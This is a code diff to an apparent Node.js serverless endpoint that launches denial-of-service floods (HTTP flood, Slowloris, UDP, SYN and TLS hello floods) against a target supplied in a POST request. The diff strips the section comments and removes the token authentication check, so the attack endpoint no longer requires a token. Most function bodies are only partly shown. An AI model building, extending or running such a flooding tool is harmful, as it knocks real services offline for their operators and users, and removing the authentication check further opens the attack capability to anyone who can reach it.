@@ -4,7 +4,7 @@ import net from 'net';
 import dgram from 'dgram';
 import tls from 'tls';
 import { URL } from 'url';
-import { cors, ratelimit, originGuard, tokenGuard, validateTarget, sanitize } from './_guard.js';
+import { cors, ratelimit, originGuard, validateTarget, sanitize } from './_guard.js';
 
 let STATE = {
   running:false, req:0, err:0, rps:0, threads:0,
@@ -29,7 +29,6 @@ function buildAgent(proto){
   return new http.Agent({ keepAlive:true, maxSockets:2048, maxFreeSockets:1024 });
 }
 
-/* ---------- HTTP FLOOD (L7) ---------- */
 function httpFlood(u, duration){
   const agent = buildAgent(u.protocol);
   const mod   = u.protocol==='https:' ? https : http;
@@ -67,7 +66,6 @@ function httpFlood(u, duration){
   for(let i=0;i<STATE.threads;i++) setImmediate(fire);
 }
 
-/* ---------- SLOWLORIS (L7 keepalive) ---------- */
 function slowloris(u, duration){
   const port = u.port || (u.protocol==='https:'?443:80);
   const end  = Date.now()+duration*1000;
@@ -90,7 +88,6 @@ function slowloris(u, duration){
   for(let i=0;i<STATE.threads;i++) open();
 }
 
-/* ---------- UDP FLOOD (L4) ---------- */
 function udpFlood(u, duration){
   const port = +u.port || 80;
   const end  = Date.now()+duration*1000;
@@ -108,7 +105,6 @@ function udpFlood(u, duration){
   for(let i=0;i<STATE.threads;i++) setImmediate(fire);
 }
 
-/* ---------- SYN FLOOD (L4 raw-ish) ---------- */
 function synFlood(u, duration){
   const port = +u.port || 80;
   const end  = Date.now()+duration*1000;
@@ -124,7 +120,6 @@ function synFlood(u, duration){
   for(let i=0;i<STATE.threads;i++) setImmediate(fire);
 }
 
-/* ---------- TLS HELLO FLOOD ---------- */
 function tlsFlood(u, duration){
   const port = +u.port || 443;
   const end  = Date.now()+duration*1000;
@@ -141,12 +136,10 @@ function tlsFlood(u, duration){
   for(let i=0;i<STATE.threads;i++) setImmediate(fire);
 }
 
-/* ---------- HANDLER ---------- */
 export default async function handler(req, res){
   if(!cors(req,res)) return;
   if(!originGuard(req,res)) return;
   if(!ratelimit(req,res)) return;
-  if(!tokenGuard(req,res)) return;
 
   if(req.method==='POST'){
     const body = req.body || {};
